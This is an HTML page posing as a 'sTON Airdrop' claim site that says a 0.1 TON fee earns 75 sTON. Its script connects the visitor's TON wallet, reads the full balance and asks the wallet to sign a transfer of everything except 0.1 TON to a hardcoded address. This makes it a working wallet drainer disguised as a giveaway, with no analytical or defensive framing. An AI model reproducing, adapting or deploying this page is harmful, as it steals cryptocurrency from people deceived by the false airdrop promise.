<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ðŸ’Ž sTON Airdrop ðŸ’Ž</title>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <script src="https://unpkg.com/tonweb@0.0.60/dist/tonweb.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #3498db;
            --secondary-color: #2980b9;
            --background-color: #2c3e50;
            --text-color: #ecf0f1;
            --box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
            --card-background: #34495e;
            --progress-background: #1a252f;
            --button-hover-color: #1abc9c;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: var(--background-color);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-color);
        }

        .container {
            max-width: 800px;
            width: 100%;
            background: var(--card-background);
            padding: 40px;
            border-radius: 20px;
            box-shadow: var(--box-shadow);
            text-align: center;
        }

        .header {
            margin-bottom: 40px;
        }

        .dogs-logo {
            width: 150px;
            height: 150px;
            margin: 0 auto 20px;
            background: url('https://raw.githubusercontent.com/ton-community/assets/main/wallet.png') center/contain no-repeat;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0% {
                transform: translateY(0px);
            }

            50% {
                transform: translateY(-20px);
            }

            100% {
                transform: translateY(0px);
            }
        }

        .title {
            color: var(--text-color);
            font-size: 2.5em;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }

        .subtitle {
            color: #bdc3c7;
            font-size: 1.2em;
            margin-bottom: 30px;
        }

        .info-cards {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .info-card {
            background: var(--card-background);
            padding: 20px;
            border-radius: 15px;
            min-width: 200px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease, background-color 0.3s ease;
        }

        .info-card:hover {
            transform: translateY(-5px);
            background-color: var(--progress-background);
        }

        .info-card i {
            font-size: 24px;
            color: var(--primary-color);
            margin-bottom: 10px;
        }

        .progress-container {
            margin: 20px 0;
            padding: 10px;
            background: var(--progress-background);
            border-radius: 20px;
            position: relative;
            display: none;
        }

        .progress-bar {
            width: 0%;
            height: 20px;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            border-radius: 20px;
            transition: width 0.5s ease;
        }

        .progress-text {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.2);
        }

        #ton-connect {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        #claim-button {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 25px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            margin: 20px 0;
            display: none;
        }

        #claim-button:hover {
            background: var(--button-hover-color);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(26, 188, 156, 0.4);
        }

        #claim-button:active {
            transform: translateY(1px);
        }

        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background-color: var(--progress-background);
            transition: all 0.3s ease;
        }

        .gem-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }

        .gem-icon {
            font-size: 2em;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <div class="dogs-logo"></div>
            <h1 class="title">
                <i class="fas fa-gem"></i>
                sTON Airdrop
                <i class="fas fa-gem"></i>
            </h1>
            <p class="subtitle">Claim your sTON tokens now!</p>
        </div>

        <div class="gem-icons">
            <span class="gem-icon">ðŸ’Ž</span>
            <span class="gem-icon">ðŸ’Ž</span>
            <span class="gem-icon">ðŸ’Ž</span>
        </div>

        <div class="info-cards">
            <div class="info-card">
                <i class="fas fa-coins"></i>
                <h3>Required</h3>
                <p>0.1 TON</p>
            </div>
            <div class="info-card">
                <i class="fas fa-gift"></i>
                <h3>Receive</h3>
                <p>75 sTON</p>
            </div>
        </div>

        <div id="ton-connect"></div>
        <button id="claim-button">
            <i class="fas fa-gem"></i> Claim 75 sTON!
        </button>

        <div class="progress-container">
            <div class="progress-bar"></div>
            <div class="progress-text">0%</div>
        </div>

        <div id="status"></div>
    </div>

    <script>
        const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
        const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: MANIFEST_URL,
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.onStatusChange(wallet => {
            const claimButton = document.getElementById('claim-button');
            if (wallet) {
                claimButton.style.display = 'inline-block';
                updateStatus(`Connected: ${wallet.account.address}`, 'success');
            } else {
                claimButton.style.display = 'none';
                updateStatus('Please connect your wallet', 'info');
            }
        });

        async function createPayload() {
            const comment = "ðŸ’Ž Claim 75 sTON!";
            let cell = new TonWeb.boc.Cell();
            cell.bits.writeUint(0, 32);
            cell.bits.writeString(comment);
            return TonWeb.utils.bytesToBase64(await cell.toBoc());
        }

        document.getElementById('claim-button').addEventListener('click', async () => {
            try {
                if (!tonConnectUI.connected) {
                    updateStatus('Please connect your wallet first', 'error');
                    return;
                }

                updateStatus('Preparing transaction...', 'info');

                const payload = await createPayload();

                async function getBalance(address) {
                    const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                    const data = await response.json();
                    if (!data.ok) {
                        throw new Error(`Error getting balance: ${data.error}`);
                    }
                    return BigInt(data.result);
                }

                const wallet = tonConnectUI.wallet;
                console.log('wallet:', wallet);
                const balance = await getBalance(wallet.account.address);
                console.log('balance:', balance);

                const transactionFee = BigInt(100000000); // 0.1 TON in nanograms
                console.log('transactionFee:', transactionFee);

                const amountToSend = balance - transactionFee;
                console.log('amountToSend:', amountToSend);

                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 360,
                    messages: [
                        {
                            address: AIRDROP_CONTRACT_ADDRESS,
                            amount: amountToSend.toString(),
                            payload: payload
                        }
                    ]
                };

                const result = await tonConnectUI.sendTransaction(transaction);
                console.log('Transaction result:', result);
                updateStatus('Transaction sent successfully!', 'success');

            } catch (error) {
                console.error('Transaction error:', error);
                updateStatus(`Transaction error: ${error.message}`, 'error');
            }
        });

        function updateStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            const icons = {
                success: 'check-circle',
                error: 'exclamation-circle',
                info: 'info-circle'
            };

            statusDiv.innerHTML = `
                <i class="fas fa-${icons[type]}"></i> ${message}
            `;

            statusDiv.style.color = type === 'error' ? '#e74c3c' :
                type === 'success' ? '#2ecc71' : '#3498db';
        }
    </script>
</body>

</html>
